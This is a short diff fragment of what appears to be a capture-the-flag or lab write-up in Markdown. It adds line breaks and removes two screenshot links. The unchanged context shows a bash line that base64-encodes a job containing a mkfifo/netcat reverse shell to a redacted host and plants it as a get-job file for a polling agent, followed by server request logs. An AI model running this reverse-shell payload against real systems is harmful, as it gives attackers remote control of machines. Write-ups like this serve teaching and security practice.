@@ -42,11 +42,12 @@ Accept: */*
 Connection: keep-alive
 ```
 
+<br>
+<br>
+
 ```bash
 :~# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
 ```
-
-<img width="920" height="197" alt="image" src="https://github.com/user-attachments/assets/8f2e737f-275a-4be5-8910-687adbc57f36" />
 
 <br>
 <br>
@@ -66,8 +67,6 @@ xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
 ```
-
-<img width="1222" height="184" alt="image" src="https://github.com/user-attachments/assets/01bb144a-9a67-4338-b2f1-a43d978b95cb" />
 
 <br>
 <br>
